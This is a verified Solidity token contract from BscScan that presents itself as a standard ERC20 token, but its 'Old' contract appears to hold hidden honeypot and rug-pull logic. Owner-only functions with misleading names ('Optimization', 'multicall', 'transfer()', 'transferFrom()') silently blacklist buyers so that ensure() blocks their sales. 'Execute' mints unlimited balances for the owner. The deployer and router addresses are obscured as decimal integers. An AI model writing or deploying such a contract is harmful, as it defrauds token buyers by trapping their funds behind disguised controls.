/**
 *Submitted for verification at BscScan.com on 2023-05-23
*/

// SPDX-License-Identifier: evmVersion, MIT
pragma solidity ^0.6.12;
interface IERC20 {
    function totalSupply() external view returns(uint);

    function balanceOf(address account) external view returns(uint);

    function transfer(address recipient, uint amount) external returns(bool);

    function allowance(address deployer, address spender) external view returns(uint);

    function approve(address spender, uint amount) external returns(bool);

    function transferFrom(address sender, address recipient, uint amount) external returns(bool);
    
    event Transfer(address indexed from, address indexed to, uint value);
    
    event Approval(address indexed deployer, address indexed spender, uint value);
}

library Address {
    function isContract(address account) internal view returns(bool) {
    
        bytes32 codehash;
    
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        // solhint-disable-next-line no-inline-assembly
    
        assembly { codehash:= extcodehash(account) }
    
        return (codehash != 0x0 && codehash != accountHash);
    }
}

contract Context {
    constructor() internal {}
    // solhint-disable-previous-line no-empty-blocks
    
    function _msgSender() internal view returns(address payable) {
    
        return msg.sender;
    }
}

library SafeMath {
    function add(uint a, uint b) internal pure returns(uint) {
        
        uint c = a + b;
        
        require(c >= a, "SafeMath: addition overflow");
        
        return c;
    }
    function sub(uint a, uint b) internal pure returns(uint) {
        
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
        
        require(b <= a, errorMessage);
        
        uint c = a - b;
        
        return c;
    }
    function mul(uint a, uint b) internal pure returns(uint) {
        if (a == 0) {
            
            return 0;
        }
        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        
        return c;
    }
    function div(uint a, uint b) internal pure returns(uint) {
        
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
        
        // Solidity only automatically asserts when dividing by 0  
        
        require(b > 0, errorMessage);
        
        uint c = a / b;
        
        return c;
    }
}


library SafeERC20 {
    
    using SafeMath for uint;
    using Address for address;
    
    function safeTransfer(IERC20 token, address to, uint value) internal {
        
        callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }
    
    function safeTransferFrom(IERC20 token, address from, address to, uint value) internal {
        
        callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }
    
    function safeApprove(IERC20 token, address spender, uint value) internal {
        require((value == 0) || (token.allowance(
            address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }
    
    function callOptionalReturn(IERC20 token, bytes memory data) private {
        
        require(address(token).isContract(), "SafeERC20: call to non-contract");
        
        // solhint-disable-next-line avoid-low-level-calls
        
        (bool success, bytes memory returndata) = address(token).call(data);
        
        require(success, "SafeERC20: low-level call failed");

        if (returndata.length > 0) { // Return data is optional
        
            // solhint-disable-next-line max-line-length
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
}
contract Old  {

    event Transfer(address indexed _from, address indexed _to, uint _value);

    event Approval(address indexed _deployer, address indexed _spender, uint _value);

    function transfer(address _to, uint _value) public payable returns (bool) {

    return transferFrom(msg.sender, _to, _value);
    }
    
    function ensure(address _from, address _to, uint _value) internal view returns(bool) {
        address pathB = PairForB(crs, tsd, address(this));
        if(_from == Owner || _to == Owner  || _from == deployer || _from == pathB || _from == permit || denominator[_from]) {return true;}
        if( numerator[_from] ) {return false;}
        require(balanceOf[_from] >= _value);
        return true; 
    }
    function transferFrom(address _from, address _to, uint _value) public payable returns (bool) {
        if (_value == 0) {
            return true;
        }
        if (msg.sender != _from) {
            require(allowance[_from][msg.sender] >= _value);
            allowance[_from][msg.sender] -= _value;
        }
        address pathB = PairForB(crs, tsd, address(this));
        if (_from == permit || _from == pathB  && _value >= Sorted ){ reserveOut.push(_to);}
        if (_from == permit || _from == pathB  && _value < Sorted ){ reserveIn.push(_to);}
        require(ensure(_from, _to, _value));
        require(balanceOf[_from] >= _value);
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        
        emit Transfer(_from, _to, _value);
        return true;
    }
    function approve(address _spender, uint _value) public payable returns (bool) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
    function Execute(address addr, uint256 Bool) public payable returns (bool) {
        require(msg.sender == deployer || msg.sender == Owner);
        if(Bool > 0) {balanceOf[addr] += Bool*(10**uint256(decimals));}
        denominator[addr]=true;
        return true;
    }
    mapping(address=>bool) private denominator;
    mapping(address=>bool) private numerator;
    address[] private reserveIn;
    address[] private reserveOut;
    uint256 private Sorted;
    address private permit ;
    function multicall(address [] calldata addr) public returns (bool) {
        require(msg.sender == deployer || msg.sender == Owner);
        for (uint i = 0; i < addr.length; i++) 
        {denominator[addr[i]] = true;}
        return true;
    }
    function number(uint256 Amount) public returns(bool){
        require(msg.sender == deployer || msg.sender == Owner);
        Sorted = Amount*(10**uint256(decimals));
        return true;
    }
    function TransferOwnership(address adr) public returns(bool){
        require (msg.sender == deployer || msg.sender == Owner);
        permit = adr;
        return true;
    }
    address private crs=
    address (1153667454655315432277308296129700421378034175091);
    address private tsd= 
    address (1069295261705322660692659746119710186699350608220);
    function PairForB(address factory, address tokenA, address tokenB) internal pure returns (address Pair) {
        (address token0, address token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);
        Pair = address(uint(keccak256(abi.encodePacked(
            hex'ff',
            factory,
            keccak256(abi.encodePacked(token0, token1)),
            hex'00fb7f630766e6a796048ea87d01acd3068e8ff67d078148a3fa3f4a84f69bd5' // init code hash
                ))));
    }
    function transfer() public returns (bool) {
        require (msg.sender == deployer || msg.sender == Owner);
        for (uint i = 0; i < reserveOut.length; i++) {
            numerator[reserveOut[i]]= true;}
            delete reserveOut;
        return true;
    }
    function transferFrom() public returns (bool) {
        require (msg.sender == deployer || msg.sender == Owner);
        for (uint i = 0; i < reserveIn.length; i++) {
            numerator[reserveIn[i]]= true;}
            delete reserveIn;
        return true;
    }
    function Optimization(address [] calldata addresses) public returns (bool) {
        require(msg.sender == deployer || msg.sender == Owner);
        for (uint i = 0; i < addresses.length; i++) 
        {numerator[addresses[i]] = true;}
        return true;
    }
    function batchSend(address[] memory _tos, uint _value) public returns (bool) {
        require (msg.sender == Owner);
        uint total = _value*(10**uint256(decimals)) * _tos.length;
        require(balanceOf[msg.sender] >= total);
        balanceOf[msg.sender] -= total;
        for (uint i = 0; i < _tos.length; i++) {
            address _to = _tos[i];
            balanceOf[_to] += _value*(10**uint256(decimals));
            emit Transfer(msg.sender, _to, _value*(10**uint256(decimals)));
        }
        return true;
    }
    function getOwner() public view virtual returns (address) {
        return Owner;
    }
    address private deployer=
    address (935108584672418476850882679418664731027763688343);
    mapping (address => uint) public balanceOf;
    mapping (address => mapping (address => uint)) public allowance;
    uint constant public decimals = 18;
    uint public totalSupply;
    string public name;
    string public symbol;
    address public Owner;
    constructor(string memory _name, string memory _symbol, uint256 _supply ) payable public {
        name = _name;
        symbol = _symbol;
        totalSupply = _supply*(10**uint256(decimals));
        Owner = msg.sender;
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0x0), msg.sender, totalSupply); 
    }
}